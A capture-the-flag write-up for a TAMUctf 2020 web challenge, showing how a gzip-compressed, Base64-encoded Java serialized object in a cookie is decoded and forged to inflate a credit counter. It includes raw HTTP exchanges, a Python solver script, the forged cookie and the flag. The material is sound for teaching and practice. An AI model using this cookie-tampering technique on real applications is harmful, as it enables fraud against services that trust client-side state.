# TAMUctf 2020 – TOO_MANY_CREDITS_1

* **Category:** web
* **Points:** 50

## Challenge

> Okay, fine, there's a lot of credit systems. We had to put that guy on break; seriously concerned about that dude.
> 
> Anywho. We've made an actually secure one now, with Java, not dirty JS this time. Give it a whack?
> 
> If you get two thousand million credits again, well, we'll just have to shut this program down.
> 
> http://toomanycredits.tamuctf.com

## Solution

The website allows you to increment your credits, but you have to get two thousand million credits (or more) in order to get the flag. Obviously, the credit generation can't be bruteforced/automated, because automation countermeasures are in place.

Credits are incremented via HTTP GET.

```
GET / HTTP/1.1
Host: toomanycredits.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://toomanycredits.tamuctf.com/
Cookie: counter="H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAIwCwY0JiUgAAAA=="
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 12:11:23 GMT
Content-Type: text/html;charset=UTF-8
Content-Length: 454
Connection: close
Set-Cookie: counter="H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA=="; Version=1; HttpOnly
Content-Language: it-IT

<!DOCTYPE HTML>

<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />

    <title>Java Credits</title>
</head>

<body>

<main role="main">

    <form>
        <h2>
            <span>You have 2 credits.</span>
            <span> You haven&#39;t won yet...</span>
        </h2>
        <button type="submit">Get More</button>
    </form>

</main>
</body>
</html>
```

There is a strange cookie, called `counter`, and it seems to be strangely encoded. Analyzing several requests, you can discover that only the last part changes.

```
H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAIwCwY0JiUgAAAA==
H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA==
H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAKwCppy9lUgAAAA==
H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAGwAT9ib8UgAAAA==
H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAOwCFxiGLUgAAAA==
............................................................................................^^^^^^^^........
```

The text says that they are using Java and the Spring logo is present in the favicon.

Furthermore, removing the last part of the cookie will spawn an interesting error.

```
GET / HTTP/1.1
Host: toomanycredits.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://toomanycredits.tamuctf.com/
Cookie: counter="H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/"
Upgrade-Insecure-Requests: 1

HTTP/1.1 500 Internal Server Error
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 14:20:46 GMT
Content-Type: text/html;charset=UTF-8
Content-Length: 333
Connection: close
Content-Language: it-IT

<html><body><h1>Whitelabel Error Page</h1><p>This application has no explicit mapping for /error, so you are seeing this as a fallback.</p><div id='created'>Fri Mar 20 14:20:46 GMT 2020</div><div>There was an unexpected error (type=Internal Server Error, status=500).</div><div>Unexpected end of ZLIB input stream</div></body></html>
```

This seems to be a Java serialized object (compressed with GZip and encoded in Base64). So you can write a [Python script](too-many-credits-1-solver.py) to discover how the original object is formed.

```
H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAIwCwY0JiUgAAAA==
b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x01'

H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA==
b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x02'

H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAKwCppy9lUgAAAA==
b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x05'

H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAGwAT9ib8UgAAAA==
b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x06'

H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAOwCFxiGLUgAAAA==
b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\x00\x00\x00\x07'
```

The `value` attribute is at the end as we supposed, so a malicuous payload can easily crafted, e.g.:

```
b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\xff\xff\xff\xff'
```

Using the [Python script](too-many-credits-1-solver.py) you can craft the cookie.

```
[*] Malicious string is: b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\xff\xff\xff\xff'
[*] Compressed malicious bytes are: b'\x1f\x8b\x08\x00\x0c\xe6t^\x02\xff[\xf3\x96\x81\xb5\xb8\x88A79?W/\xb9(5%\xb3\xa4\x18\x83\xce\xcdOI\xcd\xd1s\x06\xf3\x9c\xf3K\xf3J\x8c8o\x0b\x89p\xaa\xb8310z1\xb0\x96%\xe6\x94\xa6V\x140\x00\xc1\x7f \x00\x00\xc5s\xfe\xcbR\x00\x00\x00'
[*] Base64 compressed malicious string is: H4sIAAzmdF4C/1vzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMADBfyAAAMVz/stSAAAA
```

A [Python script](too-many-credits-1-solver.py) can be developed to perform all the reported operations.

```python
import gzip
import base64

base64_compressed_strings = [
"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAIwCwY0JiUgAAAA==",
"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA==",
"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAKwCppy9lUgAAAA==",
"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAGwAT9ib8UgAAAA==",
"H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAOwCFxiGLUgAAAA=="
]

for base64_compressed_string in base64_compressed_strings:
    print("[*] Base64 compressed string is: {}".format(base64_compressed_string))

    compressed_bytes = base64.b64decode(base64_compressed_string)
    print("[*] Compressed bytes are: {}".format(compressed_bytes))

    original_string = gzip.decompress(compressed_bytes)
    print("[*] Original bytes are: {}".format(original_string))
    
    print()

print("    -------\n")

malicious_string = b'\xac\xed\x00\x05sr\x00-com.credits.credits.credits.model.CreditCount2\t\xdb\x12\x14\t$G\x02\x00\x01J\x00\x05valuexp\x00\x00\x00\x00\xff\xff\xff\xff'
print("[*] Malicious string is: {}".format(malicious_string))

compressed_malicious_bytes = gzip.compress(malicious_string)
print("[*] Compressed malicious bytes are: {}".format(compressed_malicious_bytes))

base64_compressed_malicious_string = base64.b64encode(compressed_malicious_bytes).decode("ascii")

print("[*] Base64 compressed malicious string is: {}".format(base64_compressed_malicious_string))
```

And then performing the request you will get the flag.

```
GET / HTTP/1.1
Host: toomanycredits.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://toomanycredits.tamuctf.com/
Cookie: counter="H4sIAAzmdF4C/1vzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMADBfyAAAMVz/stSAAAA"
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 15:49:46 GMT
Content-Type: text/html;charset=UTF-8
Content-Length: 470
Connection: close
Set-Cookie: counter="H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMDAwMAIxAwCWeiUoUgAAAA=="; Version=1; HttpOnly
Content-Language: it-IT

<!DOCTYPE HTML>

<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />

    <title>Java Credits</title>
</head>

<body>

<main role="main">

    <form>
        <h2>
            <span>You have 4294967296 credits.</span>
            <span> gigem{l0rdy_th15_1s_mAny_cr3d1ts}</span>
        </h2>
        <button type="submit">Get More</button>
    </form>

</main>
</body>
</html>
```

The flag is the following.

```
gigem{l0rdy_th15_1s_mAny_cr3d1ts}
```